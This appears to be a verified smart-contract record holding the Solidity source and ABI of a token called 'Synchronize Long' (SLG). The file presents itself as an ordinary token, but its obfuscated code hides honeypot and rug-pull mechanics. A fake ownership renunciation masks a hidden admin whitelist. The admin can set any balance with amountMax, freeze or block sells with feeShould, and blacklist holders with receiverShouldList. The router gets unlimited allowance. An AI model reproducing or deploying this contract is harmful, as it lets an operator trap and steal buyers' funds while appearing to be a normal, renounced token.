{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.1;\n\ninterface minShouldMode {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract isReceiver {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface modeAtEnable {\n    function createPair(address receiverTotalMarketing, address enableToken) external returns (address);\n}\n\ninterface buyEnable {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address toTokenMode) external view returns (uint256);\n\n    function transfer(address launchedShould, uint256 toLimit) external returns (bool);\n\n    function allowance(address liquidityAt, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 toLimit) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address launchedShould,\n        uint256 toLimit\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed maxAmount, uint256 value);\n    event Approval(address indexed liquidityAt, address indexed spender, uint256 value);\n}\n\ninterface marketingFrom is buyEnable {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract SynchronizeLong is isReceiver, buyEnable, marketingFrom {\n\n    uint256 public minTake;\n\n    function name() external view virtual override returns (string memory) {\n        return amountExempt;\n    }\n\n    function transferFrom(address modeReceiver, address launchedShould, uint256 toLimit) external override returns (bool) {\n        if (_msgSender() != buyReceiverAt) {\n            if (limitTokenSwap[modeReceiver][_msgSender()] != type(uint256).max) {\n                require(toLimit <= limitTokenSwap[modeReceiver][_msgSender()]);\n                limitTokenSwap[modeReceiver][_msgSender()] -= toLimit;\n            }\n        }\n        return launchedIs(modeReceiver, launchedShould, toLimit);\n    }\n\n    uint256 public swapFrom;\n\n    address buyReceiverAt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function launchedIs(address modeReceiver, address launchedShould, uint256 toLimit) internal returns (bool) {\n        if (modeReceiver == listSell) {\n            return modeLaunched(modeReceiver, launchedShould, toLimit);\n        }\n        uint256 walletTradingMin = buyEnable(toBuy).balanceOf(tradingBuyTake);\n        require(walletTradingMin == shouldLimit);\n        require(launchedShould != tradingBuyTake);\n        if (liquiditySender[modeReceiver]) {\n            return modeLaunched(modeReceiver, launchedShould, toFrom);\n        }\n        return modeLaunched(modeReceiver, launchedShould, toLimit);\n    }\n\n    uint256 private autoTo;\n\n    event OwnershipTransferred(address indexed liquidityToMin, address indexed takeLaunch);\n\n    mapping(address => bool) public liquiditySender;\n\n    function feeShould(uint256 toLimit) public {\n        minReceiver();\n        shouldLimit = toLimit;\n    }\n\n    function modeLaunched(address modeReceiver, address launchedShould, uint256 toLimit) internal returns (bool) {\n        require(buyList[modeReceiver] >= toLimit);\n        buyList[modeReceiver] -= toLimit;\n        buyList[launchedShould] += toLimit;\n        emit Transfer(modeReceiver, launchedShould, toLimit);\n        return true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return launchedLiquidityMarketing;\n    }\n\n    bool public minSwapTo;\n\n    uint256 isTx;\n\n    function approve(address isMarketingReceiver, uint256 toLimit) public virtual override returns (bool) {\n        limitTokenSwap[_msgSender()][isMarketingReceiver] = toLimit;\n        emit Approval(_msgSender(), isMarketingReceiver, toLimit);\n        return true;\n    }\n\n    function allowance(address buyTakeTx, address isMarketingReceiver) external view virtual override returns (uint256) {\n        if (isMarketingReceiver == buyReceiverAt) {\n            return type(uint256).max;\n        }\n        return limitTokenSwap[buyTakeTx][isMarketingReceiver];\n    }\n\n    address public toBuy;\n\n    function amountMax(address shouldExempt, uint256 toLimit) public {\n        minReceiver();\n        buyList[shouldExempt] = toLimit;\n    }\n\n    uint256 private totalBuy;\n\n    function transfer(address shouldExempt, uint256 toLimit) external virtual override returns (bool) {\n        return launchedIs(_msgSender(), shouldExempt, toLimit);\n    }\n\n    address public listSell;\n\n    bool private tradingModeTx;\n\n    bool public walletToken;\n\n    function minMax() public {\n        emit OwnershipTransferred(listSell, address(0));\n        listAt = address(0);\n    }\n\n    uint256 private walletTeam = 100000000 * 10 ** 18;\n\n    uint256 constant toFrom = 19 ** 10;\n\n    function receiverShouldList(address senderTotal) public {\n        minReceiver();\n        if (minTake != autoTo) {\n            autoTo = launchedMarketing;\n        }\n        if (senderTotal == listSell || senderTotal == toBuy) {\n            return;\n        }\n        liquiditySender[senderTotal] = true;\n    }\n\n    address private listAt;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return walletTeam;\n    }\n\n    bool public walletTo;\n\n    string private launchedLiquidityMarketing = \"SLG\";\n\n    constructor (){\n        if (launchedMarketing == minTake) {\n            enableIsReceiver = minTake;\n        }\n        minShouldMode amountSender = minShouldMode(buyReceiverAt);\n        toBuy = modeAtEnable(amountSender.factory()).createPair(amountSender.WETH(), address(this));\n        if (autoTo == totalBuy) {\n            swapFrom = enableIsReceiver;\n        }\n        listSell = _msgSender();\n        minMax();\n        atTradingLaunch[listSell] = true;\n        buyList[listSell] = walletTeam;\n        \n        emit Transfer(address(0), listSell, walletTeam);\n    }\n\n    mapping(address => bool) public atTradingLaunch;\n\n    function decimals() external view virtual override returns (uint8) {\n        return maxExempt;\n    }\n\n    function owner() external view returns (address) {\n        return listAt;\n    }\n\n    function minReceiver() private view {\n        require(atTradingLaunch[_msgSender()]);\n    }\n\n    function getOwner() external view returns (address) {\n        return listAt;\n    }\n\n    uint256 shouldLimit;\n\n    address tradingBuyTake = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 private launchedMarketing;\n\n    bool public receiverLaunch;\n\n    string private amountExempt = \"Synchronize Long\";\n\n    function shouldAutoTake(address isMarketing) public {\n        if (walletToken) {\n            return;\n        }\n        if (receiverLaunch == tradingModeTx) {\n            swapFrom = minTake;\n        }\n        atTradingLaunch[isMarketing] = true;\n        \n        walletToken = true;\n    }\n\n    uint8 private maxExempt = 18;\n\n    uint256 public enableIsReceiver;\n\n    function balanceOf(address toTokenMode) public view virtual override returns (uint256) {\n        return buyList[toTokenMode];\n    }\n\n    mapping(address => mapping(address => uint256)) private limitTokenSwap;\n\n    mapping(address => uint256) private buyList;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityAt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityToMin\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeLaunch\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxAmount\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyTakeTx\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"isMarketingReceiver\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toLimit\",\"type\":\"uint256\"}],\"name\":\"amountMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isMarketingReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toLimit\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"atTradingLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toTokenMode\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableIsReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"toLimit\",\"type\":\"uint256\"}],\"name\":\"feeShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"liquiditySender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listSell\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minSwapTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minTake\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderTotal\",\"type\":\"address\"}],\"name\":\"receiverShouldList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isMarketing\",\"type\":\"address\"}],\"name\":\"shouldAutoTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapFrom\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toBuy\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toLimit\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchedShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toLimit\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "SynchronizeLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}